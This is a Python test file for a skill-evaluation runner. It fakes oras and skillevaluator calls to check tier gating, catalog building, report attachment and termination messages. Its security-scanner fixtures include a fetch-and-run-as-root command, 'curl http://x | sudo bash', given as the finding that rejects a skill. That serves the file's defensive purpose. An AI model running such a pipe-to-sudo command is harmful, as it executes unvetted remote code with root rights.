"""Tests for the runner entrypoint; subprocess calls are replaced by fakes."""

from __future__ import annotations

import json
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

import skill_eval

ENV = {
    "SKILL_REF": "harbor.example/skills/acme@sha256:abc",
    "SKILL_NAME": "acme",
    "AGENT": "claude-code",
    "MODEL": "claude-haiku-5-5",
    "ATTEMPTS": "2",
}


def agent_entry(with_skill: Any, without_skill: Any, model: str = "claude-haiku-5-5") -> dict:
    """Build one ``agents.<name>`` entry as SkillEvaluator writes it."""
    return {
        "model": model,
        "overall_with_skill": with_skill,
        "overall_without_skill": without_skill,
    }


def validator(
    check: str,
    status: str = "passed",
    findings: list[dict] | None = None,
    errors: list[str] | None = None,
    incomplete: list[str] | None = None,
    tier: int = 1,
    skip_reason: str | None = None,
) -> dict:
    """Build one ``results[]`` entry of a SkillEvaluator ``validate`` JSON report."""
    return {
        "validator": check.title(),
        "status": status,
        "passed": status in ("passed", "skipped"),
        "skipped": status == "skipped",
        "skip_reason": skip_reason,
        "incomplete_scans": incomplete or [],
        "findings": findings or [],
        "legacy": {"errors": errors or [], "warnings": [], "messages": []},
        "gating": {"tier": tier, "blocking": True},
        "publication_evidence": {
            "schema_version": 1,
            "producer": f"skillevaluator.tier{tier}",
            "tier": tier,
            "check_id": check,
        },
    }


def finding(rule: str, message: str, path: str = "scripts/x.sh", line: int = 5, sev="high") -> dict:
    """Build one ``findings[]`` entry."""
    return {
        "severity": sev,
        "check_name": rule,
        "message": message,
        "file_path": path,
        "line_number": line,
    }


def report(*results: dict, publication: str | None = None) -> dict:
    """Build a ``validate`` JSON report; ``publication`` defaults to what its results imply."""
    failed = any(r["status"] == "failed" for r in results)
    return {
        "overall_status": "failed" if failed else "passed",
        "results": list(results),
        "publication": {"status": publication or ("fail" if failed else "pass")},
    }


PASS = report(validator("schema"), validator("similarity", tier=2))


def with_publication(content: dict, status: str) -> dict:
    """Return ``content`` with SkillEvaluator's publication status replaced."""
    return {**content, "publication": {"status": status}}


TIER2_FAILED = report(
    validator("schema"),
    validator(
        "similarity",
        "failed",
        [finding("EXACT_DUPLICATE", "matches 'other'", "acme", 0)],
        tier=2,
    ),
)
SCANNER_MISSING = report(
    validator(
        "security",
        "incomplete",
        errors=["[SECURITY-HIGH] skillspector did not complete"],
        incomplete=["skillspector"],
    ),
    validator("similarity", tier=2),
    publication="incomplete",
)
TIER2_SKIPPED = report(
    validator("schema"),
    validator(
        "context-optimization",
        "skipped",
        tier=2,
        skip_reason="Tier 2 skipped: embedding setup is required.\nmore",
    ),
    publication="incomplete",
)
GOOD = {"agents": {"claude-code": agent_entry(0.951, 0.364)}}
REPORT = "sha256:" + "c" * 64
TRIALS = "sha256:" + "b" * 64  # the trial bundle's digest
# What happened, in order: validate runs, flow collection, bundle builds and attaches.
EVENTS: list[str] = []
TIERS_OK = {"tier1": "passed", "tier2": "passed", "tier3": "passed"}
GOOD_PAYLOAD = {
    "withSkill": 0.95,
    "withoutSkill": 0.36,
    "lift": 0.59,
    "agent": "claude-code",
    "model": "claude-haiku-5-5",
    "agentVersion": "2.1.292",
    "report": REPORT,
    "tiers": TIERS_OK,
    "publication": "passed",
    "findings": [],
}
NO_REPORT = {k: v for k, v in GOOD_PAYLOAD.items() if k != "report"}
CURL_BASH = report(
    validator(
        "security",
        "failed",
        [
            finding("Chaining Abuse (TM2)", "Tool Misuse: | sudo", sev="high"),
            finding("Unknown (LP3)", "opaque intent", "SKILL.md", 1, sev="medium"),
            finding("External Script Fetching (SC2)", "curl http://x | sudo bash", sev="high"),
        ],
    ),
    validator("similarity", tier=2),
)


class FakeRun:
    """Stands in for subprocess.run: fakes oras and skillevaluator.

    ``gate`` is the report of ``validate --tiers 1,2``, ``full`` the report of the run with
    Tier 3. Like SkillEvaluator, a report holds only the tiers that were selected, and its
    publication is ``incomplete`` unless all three ran (``None`` writes no report at all).
    ``evals`` is the Tier 3 source file the pulled skill carries, relative to the skill
    directory (``None``: the skill has no ``evals/`` at all).
    """

    def __init__(
        self,
        result: Any = GOOD,
        gate: Any = PASS,
        full: Any = PASS,
        eval_exit: int = 0,
        pull_exit: int = 0,
        skill_dir: bool = True,
        attach_exit: int = 0,
        repos: list[str] | None = None,
        tags: dict[str, list[str]] | None = None,
        catalog_exit: int = 0,
        attach_failures: int = 0,
        trial_versions: list[str] | None = None,
        evals: str | None = "evals/evals.json",
        trials: list[tuple[str, str, str, str | None]] | None = None,
        trials_attach_exit: int = 0,
    ):
        self.evals = evals
        self.trials = trials or []  # (arm, trial id, started_at, finished_at) in the run dir
        self.trials_attach_exit = trials_attach_exit  # exit code of the trial bundle attach
        self.attaches: list[dict[str, Any]] = []  # every oras attach: type, command, directory
        self.trial_versions = trial_versions  # agent_info.version of the kept Harbor trials
        self.attach_failures = attach_failures  # attach calls that fail before one succeeds
        self.result = result
        self.gate = gate
        self.full = full
        self.eval_exit = eval_exit
        self.pull_exit = pull_exit
        self.skill_dir = skill_dir
        self.attach_exit = attach_exit
        self.repos = repos if repos is not None else []
        self.tags = tags or {}
        self.catalog_exit = catalog_exit
        self.calls: list[list[str]] = []
        self.envs: dict[str, dict[str, str]] = {}
        self.attach_cwd: Path | None = None
        self.bundle: list[str] = []
        self.bundle_text: dict[str, str] = {}

    def names(self) -> list[str]:
        """Return the ``oras``/``skillevaluator`` sub-commands that ran, in order."""
        return [" ".join(c[:3] if c[0] == "oras" else c[:2]) for c in self.calls]

    def validates(self) -> list[list[str]]:
        """Return the ``skillevaluator validate`` command lines, in order."""
        return [c for c in self.calls if c[:2] == ["skillevaluator", "validate"]]

    def tier3_ran(self) -> bool:
        """Return whether a ``validate`` run selected Tier 3."""
        return any("3" in c[c.index("--tiers") + 1].split(",") for c in self.validates())

    def report_attaches(self) -> list[list[str]]:
        """Return the ``oras attach`` command lines of the report, in order."""
        return [a["cmd"] for a in self.attaches if a["type"] == skill_eval.REPORT_TYPE]

    def trials_attaches(self) -> list[list[str]]:
        """Return the ``oras attach`` command lines of the trial bundle, in order."""
        return [a["cmd"] for a in self.attaches if a["type"] == skill_eval.BUNDLE_TYPE]

    def oras(self, cmd: list[str], kwargs: dict[str, Any]) -> subprocess.CompletedProcess:
        """Fake the oras sub-commands the runner uses."""
        if cmd[1] == "attach":
            kind = cmd[cmd.index("--artifact-type") + 1]
            self.attaches.append({"type": kind, "cmd": cmd, "cwd": kwargs.get("cwd")})
            EVENTS.append(f"attach {kind}")
            if kind == skill_eval.BUNDLE_TYPE:
                if self.trials_attach_exit:
                    return subprocess.CompletedProcess(cmd, self.trials_attach_exit, "", "denied")
                return subprocess.CompletedProcess(cmd, 0, f"Digest: {TRIALS}\n", "")
            self.attach_cwd = kwargs.get("cwd")
            self.bundle = sorted(p.name for p in Path(kwargs["cwd"]).iterdir())
            self.bundle_text = {p.name: p.read_text() for p in Path(kwargs["cwd"]).iterdir()}
            if self.attach_failures > 0:
                self.attach_failures -= 1
                return subprocess.CompletedProcess(cmd, 1, "", "HEAD manifests: status code 502")
            if self.attach_exit:
                return subprocess.CompletedProcess(cmd, self.attach_exit, "", "unauthorized")
            out = f"Attached to [registry] {ENV['SKILL_REF']}\nDigest: {REPORT}\n"
            return subprocess.CompletedProcess(cmd, 0, out, "")
        if cmd[1] == "repo" and cmd[2] == "ls":
            return subprocess.CompletedProcess(cmd, 0, "\n".join(self.repos) + "\n", "")
        if cmd[1] == "repo" and cmd[2] == "tags":
            name = cmd[3].rsplit("/", 1)[1]
            return subprocess.CompletedProcess(cmd, 0, "\n".join(self.tags.get(name, [])), "")
        dest = Path(cmd[cmd.index("--output") + 1])
        if cmd[2] == ENV["SKILL_REF"]:
            if self.skill_dir and self.pull_exit == 0:
                (dest / ENV["SKILL_NAME"]).mkdir(parents=True)
                if self.evals is not None:
                    source = dest / ENV["SKILL_NAME"] / self.evals
                    source.parent.mkdir(parents=True)
                    source.write_text("[]")
            stderr = "denied" if self.pull_exit else ""
            return subprocess.CompletedProcess(cmd, self.pull_exit, "", stderr)
        name = cmd[2].rsplit("/", 1)[1].split(":")[0]  # a catalog skill
        (dest / name).mkdir(parents=True)
        (dest / name / "SKILL.md").write_text("---\nname: x\n---\n")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    def validate(self, cmd: list[str]) -> subprocess.CompletedProcess:
        """Fake ``skillevaluator validate``: write the combined report and, with Tier 3, scores."""
        selected = set(cmd[cmd.index("--tiers") + 1].split(","))
        with_tier3 = "3" in selected
        EVENTS.append(f"validate {cmd[cmd.index('--tiers') + 1]}")
        content = self.full if with_tier3 else self.gate
        if with_tier3 and self.result is not None:
            run_dir = Path(cmd[cmd.index("--results-dir") + 1]) / "acme" / "20260101_000000"
            run_dir.mkdir(parents=True)
            text = self.result if isinstance(self.result, str) else json.dumps(self.result)
            (run_dir / "result.json").write_text(text)
            (run_dir / "report.html").write_text("<html>tier 3</html>")
            for i, version in enumerate(self.trial_versions or []):
                trial = run_dir / "_harbor-jobs" / "acme-with" / f"trial__{i}"
                trial.mkdir(parents=True)
                info = {"name": "claude-code", "version": version}
                (trial / "result.json").write_text(json.dumps({"agent_info": info}))
            for arm, trial_id, started, finished in self.trials:
                trial = run_dir / "claude-code" / arm / "trials" / trial_id
                trial.mkdir(parents=True)
                times = {"started_at": started, "finished_at": finished}
                (trial / "result.json").write_text(json.dumps(times))
        if content is None:
            return subprocess.CompletedProcess(cmd, 1, "", "provider error\nboom")
        results = [r for r in content["results"] if str(r["gating"]["tier"]) in selected]
        publication = dict(content["publication"])
        if selected != {"1", "2", "3"} and publication["status"] == "pass":
            publication["status"] = "incomplete"
        out = Path(cmd[cmd.index("-o") + 1])
        out.mkdir(parents=True, exist_ok=True)
        text = json.dumps({**content, "results": results, "publication": publication})
        (out / "skillevaluator-output-1.json").write_text(text)
        (out / "skillevaluator-output-1.html").write_text("<html>combined</html>")
        (out / "BENCHMARK.md").write_text("# benchmark")
        return subprocess.CompletedProcess(cmd, self.eval_exit if with_tier3 else 0, "", "")

    def __call__(self, cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        self.calls.append(cmd)
        if cmd[0] == "oras":
            return self.oras(cmd, kwargs)
        if "env" in kwargs:
            self.envs[cmd[1]] = kwargs["env"]
        if cmd[1] == "similarity-check":
            if not self.catalog_exit:
                Path(cmd[cmd.index("--save-catalog") + 1]).write_text("{}")
            return subprocess.CompletedProcess(cmd, self.catalog_exit, "", "embedding failed")
        return self.validate(cmd)


@dataclass(frozen=True)
class Credential:
    """trial_bundle.Credential."""

    role: str
    env: str
    host: str


@dataclass
class Bundle:
    """trial_bundle.Bundle."""

    directory: Path
    files: list[str]
    index: dict[str, Any]
    annotations: dict[str, str]
    withheld: list[dict[str, Any]] = field(default_factory=list)


@dataclass(frozen=True)
class NotBuilt:
    """trial_bundle.NotBuilt."""

    reason: str
    detail: str = ""


@dataclass(frozen=True)
class Limits:
    """trial_bundle.Limits, the one field the runner reads."""

    flow_rows: int = 200


BUNDLE_FILES = [
    "index.json:application/vnd.skillci.trials.index.v1+json",
    "trial-t1.json.gz:application/vnd.skillci.trial.v1+gzip",
]


class FakeTrialBundle:
    """Stands in for the trial_bundle module (work package 1), recording every call.

    ``outcome`` is what ``build`` does: ``None`` writes a bundle, a ``NotBuilt`` is returned,
    an exception is raised. ``drop`` are report files the redaction refuses.
    """

    ARTIFACT_TYPE = "application/vnd.skillci.trials.v1+json"
    SCHEMA_MAJOR = "1"
    REDACTION_VERSION = "v1"
    Credential = Credential
    Bundle = Bundle
    NotBuilt = NotBuilt

    def __init__(self) -> None:
        self.outcome: Any = None
        self.builds: list[dict[str, Any]] = []
        self.drop: set[str] = set()
        self.redact_error: Exception | None = None
        self.redacted: list[list[str]] = []
        self.auth_configs: list[Path] = []

    def enabled(self, environ):
        return (environ.get("TRIAL_BUNDLE") or "on").strip().lower() != "off"

    def limits_from_env(self, environ):
        return Limits(flow_rows=7)

    def build(self, run_dir, out, **kwargs):
        EVENTS.append("bundle.build")
        self.builds.append({"run_dir": run_dir, "out": out, **kwargs})
        if isinstance(self.outcome, Exception):
            raise self.outcome
        if self.outcome is not None:
            return self.outcome
        out.mkdir(parents=True)
        (out / "index.json").write_text("{}")
        (out / "trial-t1.json.gz").write_bytes(b"\x1f\x8b")
        annotations = {"skillci.dev/eval": kwargs["config"]["SKILLEVAL_NAME"]}
        return Bundle(out, ["index.json", "trial-t1.json.gz"], {}, annotations)

    def oras_files(self, bundle):
        return list(BUNDLE_FILES)

    def secret_values(self, environ, auth_config):
        self.auth_configs.append(auth_config)
        return {"ANTHROPIC_API_KEY": environ.get("ANTHROPIC_API_KEY", "")}

    def Redactor(self, secrets):  # a class in the real module
        return ("redactor", dict(secrets))

    def redact_report_files(self, directory, files, redactor):
        if self.redact_error is not None:
            raise self.redact_error
        self.redacted.append(list(files))
        return [name for name in files if name not in self.drop]


@dataclass(frozen=True)
class Window:
    """flows.Window."""

    start: datetime
    end: datetime


class FakeCollector:
    """A started flows.FlowCollector."""

    def __init__(self, flows: FakeFlows) -> None:
        self.flows = flows

    def stop(self):
        EVENTS.append("flows.stop")
        if self.flows.stop_error is not None:
            raise self.flows.stop_error
        return "collection"


class FakeFlows:
    """Stands in for the flows module (work package 8), recording every call."""

    Window = Window

    def __init__(self) -> None:
        self.started: list[tuple[str, Path]] = []
        self.summaries: list[tuple[Any, dict[str, Window], int]] = []
        self.start_error: Exception | None = None
        self.stop_error: Exception | None = None
        self.summary_error: Exception | None = None

    def start_from_env(self, environ, eval_name, work):
        EVENTS.append("flows.start")
        self.started.append((eval_name, work))
        if self.start_error is not None:
            raise self.start_error
        return FakeCollector(self) if environ.get("HUBBLE_SERVER") else None

    def summarize(self, collection, trials, *, max_rows):
        self.summaries.append((collection, dict(trials), max_rows))
        if self.summary_error is not None:
            raise self.summary_error
        return {"state": "collected"}, {trial: {"dns": []} for trial in trials}


@dataclass
class Modules:
    """The fake trial_bundle and flows modules a test runs with."""

    bundle: FakeTrialBundle
    flows: FakeFlows


@pytest.fixture(autouse=True)
def modules(monkeypatch) -> Modules:
    """Replace trial_bundle and flows (built in parallel) with recording fakes."""
    EVENTS.clear()
    fakes = Modules(FakeTrialBundle(), FakeFlows())
    monkeypatch.setitem(sys.modules, skill_eval.BUNDLE_MODULE, fakes.bundle)
    monkeypatch.setitem(sys.modules, skill_eval.FLOWS_MODULE, fakes.flows)
    return fakes


@pytest.fixture(autouse=True)
def sleeps(monkeypatch):
    """Record the retry backoff instead of waiting for it."""
    waited: list[float] = []
    monkeypatch.setattr(skill_eval.time, "sleep", waited.append)
    return waited


@pytest.fixture
def termination(tmp_path, monkeypatch):
    """Point the termination log at a temp file and return a reader for it."""
    path = tmp_path / "termination-log"
    monkeypatch.setenv("TERMINATION_LOG", str(path))
    for key in (
        "SKILL_EVAL_LLM_PROVIDER",
        "SKILL_EVAL_EMBEDDING_PROVIDER",
        "NVIDIA_API_KEY",
        "SANDBOX_IMAGE",
        "SANDBOX_PULL_SECRETS",
        "TASK_IMAGE_REGISTRY",
        "TASK_IMAGE_PULL_SECRET",
        "HARBOR_SANDBOX_IMAGE",
        "SANDBOX_WARM_POOL",
        "HARBOR_SANDBOX_WARM_POOL",
        "SKILLEVAL_NAME",
        "SKILL_VERSION",
        "HUBBLE_SERVER",
        "TRIAL_BUNDLE",
        "SKILL_EVAL_LLM_MODEL",
        "SKILL_EVAL_LLM_BASE_URL",
        "SKILL_EVAL_LLM_API_KEY",
        "ANTHROPIC_BASE_URL",
        "OPENAI_BASE_URL",
    ):
        monkeypatch.delenv(key, raising=False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "anthropic-test")
    monkeypatch.setenv("OPENAI_API_KEY", "openai-test")
    for key, value in ENV.items():
        monkeypatch.setenv(key, value)
    return lambda: json.loads(path.read_text())


@pytest.mark.parametrize(
    ("name", "fake", "code", "expected"),
    [
        ("good result", FakeRun(GOOD), 0, GOOD_PAYLOAD),
        ("eval exits non-zero but scores exist", FakeRun(GOOD, eval_exit=1), 0, GOOD_PAYLOAD),
        ("attach fails, eval still succeeds", FakeRun(GOOD, attach_exit=1), 0, NO_REPORT),
        (
            "hurting skill is a valid result",
            FakeRun({"agents": {"claude-code": agent_entry(0.4, 0.9)}}),
            0,
            {**GOOD_PAYLOAD, "withSkill": 0.4, "withoutSkill": 0.9, "lift": -0.5},
        ),
        (
            "missing agent",
            FakeRun({"agents": {"codex": agent_entry(1, 0)}}),
            1,
            "no entry for agent 'claude-code'",
        ),
        (
            "missing result file",
            FakeRun(None, eval_exit=2),
            1,
            "skillevaluator exited 2: SkillEvaluator wrote no result.json",
        ),
        (
            "null scores report execution errors",
            FakeRun(
                {
                    "agents": {"claude-code": agent_entry(None, None)},
                    "execution_errors": ["build failed"],
                }
            ),
            1,
            "no scores in result.json: build failed",
        ),
        ("corrupt result file", FakeRun("{not json"), 1, "cannot read result.json"),
        ("oras pull fails", FakeRun(GOOD, pull_exit=1), 1, "oras pull failed (1): denied"),
        (
            "artifact lacks skill directory",
            FakeRun(GOOD, skill_dir=False),
            1,
            "no directory named 'acme'",
        ),
    ],
)
def test_main(name, fake, code, expected, termination, monkeypatch):
    """main() writes the contract's termination message and exit code.

    A failure before the gate is the error alone; one in Tier 3 keeps the gate's tiers and the
    report attached anyway.
    """
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == code, name
    written = termination()
    if code == 0:
        assert written == expected
    elif name in ("oras pull fails", "artifact lacks skill directory"):
        assert expected in written["error"]
        assert set(written) == {"error"}
    else:
        assert expected in written["error"]
        assert written["tiers"] == {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"}
        assert written["findings"] == []
        assert written["report"] == REPORT
        assert set(written) == {"error", "tiers", "findings", "report"}


@pytest.mark.parametrize(
    ("name", "fake", "tiers", "publication", "findings"),
    [
        (
            "tier 1 fails on curl piped to bash",
            FakeRun(GOOD, gate=CURL_BASH),
            {"tier1": "failed", "tier2": "passed", "tier3": "skipped"},
            "failed",
            [
                "tier1/security: Chaining Abuse (TM2): Tool Misuse: | sudo (scripts/x.sh:5)",
                "tier1/security: External Script Fetching (SC2): curl http://x | sudo bash"
                " (scripts/x.sh:5)",
            ],
        ),
        (
            "tier 2 fails on a duplicate",
            FakeRun(GOOD, gate=TIER2_FAILED),
            {"tier1": "passed", "tier2": "failed", "tier3": "skipped"},
            "failed",
            ["tier2/similarity: EXACT_DUPLICATE: matches 'other' (acme)"],
        ),
        (
            "tier 1 incomplete still runs tier 3",
            FakeRun(GOOD, gate=SCANNER_MISSING, full=SCANNER_MISSING),
            {"tier1": "incomplete", "tier2": "passed", "tier3": "passed"},
            "incomplete",
            ["tier1/security: skillspector did not complete"],
        ),
        (
            "tier 2 skipped by SkillEvaluator leaves tier 2 incomplete",
            FakeRun(GOOD, gate=TIER2_SKIPPED, full=TIER2_SKIPPED),
            {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"},
            "incomplete",
            ["tier2/context-optimization: Tier 2 skipped: embedding setup is required."],
        ),
        (
            "validate crashes without a report",
            FakeRun(GOOD, gate=None, full=None),
            {"tier1": "incomplete", "tier2": "incomplete", "tier3": "passed"},
            "incomplete",
            ["tier1/run: boom"],
        ),
        (
            "tier 3 ran with failed trials",
            FakeRun({**GOOD, "execution_status": "incomplete", "execution_errors": ["trial 2"]}),
            {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"},
            "incomplete",
            ["tier3/execution: trial 2"],
        ),
        (
            "neutral publication counts as passed",
            FakeRun(GOOD, full=with_publication(PASS, "neutral")),
            {"tier1": "passed", "tier2": "passed", "tier3": "passed"},
            "passed",
            [],
        ),
        (
            "SkillEvaluator says incomplete although every tier passed",
            FakeRun(GOOD, full=with_publication(PASS, "incomplete")),
            {"tier1": "passed", "tier2": "passed", "tier3": "passed"},
            "incomplete",
            [],
        ),
        (
            "SkillEvaluator says passed but tier 3 is incomplete",
            FakeRun({**GOOD, "execution_status": "failed", "execution_errors": ["x"]}),
            {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"},
            "incomplete",
            ["tier3/execution: x"],
        ),
        (
            "full run reports a tier 1 failure the gate missed",
            FakeRun(GOOD, full=CURL_BASH),
            {"tier1": "failed", "tier2": "passed", "tier3": "passed"},
            "failed",
            [
                "tier1/security: Chaining Abuse (TM2): Tool Misuse: | sudo (scripts/x.sh:5)",
                "tier1/security: External Script Fetching (SC2): curl http://x | sudo bash"
                " (scripts/x.sh:5)",
            ],
        ),
    ],
)  # fmt: skip
def test_tiers(name, fake, tiers, publication, findings, termination, monkeypatch):
    """Tier 3 runs unless Tier 1 or 2 failed; the message carries tiers and findings."""
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, name
    written = termination()
    assert written["tiers"] == tiers
    assert written["publication"] == publication
    assert written["findings"] == findings
    assert fake.tier3_ran() == (tiers["tier3"] != "skipped")
    if tiers["tier3"] == "skipped":
        assert not {"withSkill", "withoutSkill", "lift"} & set(written)
        assert written["report"] == REPORT


def test_rejected_run_spends_no_tier3_trials(termination, monkeypatch):
    """A Rejected skill gets the gate run only: no Tier 3 command, no sandboxes."""
    fake = FakeRun(GOOD, gate=CURL_BASH)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    (gate,) = fake.validates()
    assert gate[gate.index("--tiers") + 1] == "1,2"
    assert "--results-dir" not in gate


NO_DATASET = (
    "no eval dataset: the live evaluation (Tier 3) needs test cases in evals/evals.json. "
    "Draft them with `make draft-evals SKILL=acme` (skillevaluator create-eval-dataset), "
    "review them, and push again"
)


def test_no_eval_dataset_runs_the_gate_only(termination, monkeypatch):
    """A skill without evals/ gets Tier 1 and 2, no Tier 3 run, and an actionable error."""
    fake = FakeRun(GOOD, evals=None)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 1
    assert termination() == {
        "error": NO_DATASET,
        "tiers": {"tier1": "passed", "tier2": "passed", "tier3": "skipped"},
        "findings": [],
    }
    (gate,) = fake.validates()
    assert gate[gate.index("--tiers") + 1] == "1,2"
    assert not fake.tier3_ran()
    assert "oras attach --artifact-type" not in fake.names()


@pytest.mark.parametrize(
    "source",
    [
        *(f"evals/{name}" for name in skill_eval.EVAL_DATASET_FILES),
        "evals/harbor/case-1/task.toml",
    ],
)
def test_tier3_sources(source, termination, monkeypatch):
    """Every dataset file SkillEvaluator reads, and native Harbor tasks, start Tier 3."""
    fake = FakeRun(GOOD, evals=source)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, source
    assert fake.tier3_ran()
    assert termination() == GOOD_PAYLOAD


@pytest.mark.parametrize(
    ("name", "source", "expected"),
    [
        ("no evals directory", None, False),
        ("evals without a dataset", "evals/config.yml", False),
        ("dataset outside evals", "evals.json", False),
        ("evals.json", "evals/evals.json", True),
        ("dataset.jsonl", "evals/dataset.jsonl", True),
        ("native harbor tasks", "evals/harbor/case-1/task.toml", True),
    ],
)
def test_has_tier3_source(name, source, expected, tmp_path):
    """has_tier3_source finds the dataset files and evals/harbor/ only."""
    if source is not None:
        (tmp_path / source).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / source).write_text("[]")
    assert skill_eval.has_tier3_source(tmp_path) is expected, name


@pytest.mark.parametrize(("name", "gate"), [("tier 1", CURL_BASH), ("tier 2", TIER2_FAILED)])
def test_rejected_without_eval_dataset(name, gate, termination, monkeypatch):
    """A Tier 1 or 2 failure is Rejected as before, whether or not the skill has evals."""
    fake = FakeRun(GOOD, gate=gate, evals=None)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, name
    written = termination()
    assert "error" not in written
    assert written["publication"] == "failed"
    assert written["tiers"]["tier3"] == "skipped"
    assert "failed" in (written["tiers"]["tier1"], written["tiers"]["tier2"])
    assert written["report"] == REPORT
    assert not fake.tier3_ran()


def test_rejected_run_attaches_the_failing_report(termination, monkeypatch):
    """A skipped Tier 3 still attaches the combined report of the gate run."""
    fake = FakeRun(GOOD, gate=CURL_BASH)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.bundle == ["BENCHMARK.md", "report.html", "result.json"]
    attach = fake.calls[-1]
    assert "skillci.dev/publication=failed" in attach
    assert not any(a.startswith("skillci.dev/lift") for a in attach)
    # No Tier 3, no trials: the report says so and no bundle is attached.
    assert "skillci.dev/trials-withheld=no-trials" in attach
    assert fake.trials_attaches() == []


def test_one_validate_covers_all_tiers(termination, monkeypatch):
    """After the gate, one validate run (all tiers, catalog, Tier 3 options) gives the report."""
    fake = FakeRun(GOOD, repos=["skills/acme", "skills/other"], tags={"other": ["v1.0.0"]})
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.names() == [
        "oras pull harbor.example/skills/acme@sha256:abc",
        "oras repo ls",
        "oras repo tags",
        "oras pull harbor.example/skills/other:v1.0.0",
        "skillevaluator similarity-check",
        "skillevaluator validate",
        "skillevaluator validate",
        "oras attach --artifact-type",
        "oras attach --artifact-type",
    ]
    gate, full = fake.validates()
    for cmd, tiers in ((gate, "1,2"), (full, "1,2,3")):
        assert cmd[2].endswith("/skills/acme")
        for flag, value in [("--tiers", tiers), ("--profile", "external"), ("-r", "json,html")]:
            assert cmd[cmd.index(flag) + 1] == value
        assert "--no-llm" in cmd
        assert cmd[cmd.index("--catalog") + 1].endswith("/catalog.json")
    assert "--results-dir" not in gate
    assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
    assert fake.envs["validate"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"
    assert fake.envs["similarity-check"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"


@pytest.mark.parametrize(
    ("name", "repos", "tags", "pulled"),
    [
        ("other skills, newest version", ["skills/acme", "skills/a", "skills/b"],
         {"a": ["v1.0.0", "v1.10.0", "v1.9.0", "beta"], "b": ["beta"]}, ["a:v1.10.0"]),
        ("stable wins over newer", ["skills/a"], {"a": ["v2.0.0", "stable"]}, ["a:stable"]),
        ("skill under test is excluded", ["skills/acme"], {"acme": ["v1.0.0"]}, []),
        ("other projects are ignored", ["library/x", "skills/a"], {"a": ["v1.0.0"]}, ["a:v1.0.0"]),
        ("names relative to the project", ["acme", "a"], {"a": ["v1.0.0"]}, ["a:v1.0.0"]),
        ("no repositories", [], {}, []),
    ],
)  # fmt: skip
def test_catalog(name, repos, tags, pulled, termination, monkeypatch):
    """The catalog holds the other skills at stable, else at their newest vX.Y.Z."""
    fake = FakeRun(GOOD, repos=repos, tags=tags)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, name
    pulls = [c[2].split("/", 2)[2] for c in fake.calls if c[:2] == ["oras", "pull"]][1:]
    assert pulls == pulled
    for cmd in fake.validates():
        assert ("--catalog" in cmd) == bool(pulled)
    assert ("similarity-check" in {c[1] for c in fake.calls}) == bool(pulled)


@pytest.mark.parametrize(
    ("tags", "expected"),
    [
        (["v1.0.0", "v1.2.0", "v1.10.0"], "v1.10.0"),
        (["v1.0.0", "stable", "v9.0.0"], "stable"),
        (["beta", "latest", "v1.2"], None),
        ([], None),
    ],
)
def test_pick_tag(tags, expected):
    """Tags are compared as versions, not as text."""
    assert skill_eval.pick_tag(tags) == expected


def test_catalog_build_failure_is_incomplete(termination, monkeypatch):
    """A catalog that cannot be built leaves Tier 2 out; Tier 3 still runs."""
    fake = FakeRun(GOOD, repos=["skills/a"], tags={"a": ["v1.0.0"]}, catalog_exit=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    written = termination()
    assert written["tiers"] == {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"}
    assert written["publication"] == "incomplete"
    assert written["findings"] == ["tier2/catalog: embedding failed"]
    assert [c[c.index("--tiers") + 1] for c in fake.validates()] == ["1", "1,3"]
    assert all("--catalog" not in c for c in fake.validates())


def test_no_embeddings_provider(termination, monkeypatch):
    """Without an OpenAI or NVIDIA key Tier 2 is incomplete and says why."""
    monkeypatch.delenv("OPENAI_API_KEY")
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    written = termination()
    assert written["tiers"] == {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"}
    assert written["publication"] == "incomplete"
    assert len(written["findings"]) == 1
    assert "OPENAI_API_KEY" in written["findings"][0]
    assert [c[c.index("--tiers") + 1] for c in fake.validates()] == ["1", "1,3"]
    assert "similarity-check" not in {c[1] for c in fake.calls}


def test_findings_are_capped_and_short(termination, monkeypatch):
    """At most five findings of at most 200 characters, whatever the report holds."""
    many = [finding(f"Rule {i}", "x" * 500, f"f{i}.sh", i) for i in range(1, 9)]
    fake = FakeRun(GOOD, gate=report(validator("security", "failed", many)))
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    findings = termination()["findings"]
    assert len(findings) == skill_eval.MAX_FINDINGS
    assert all(len(f) <= skill_eval.MAX_FINDING_CHARS for f in findings)
    assert findings[0].startswith("tier1/security: Rule 1: xxx")
    assert findings[0].endswith("...")


def test_message_stays_under_4kb(termination, monkeypatch, tmp_path):
    """Even a payload that is too large is cut down to the Kubernetes limit."""
    payload = {**GOOD_PAYLOAD, "findings": ["tier1/security: " + "y" * 190] * 30}
    path = tmp_path / "log"
    skill_eval.write_termination(payload, str(path))
    text = path.read_text()
    assert len(text.encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert json.loads(text)["tiers"] == TIERS_OK
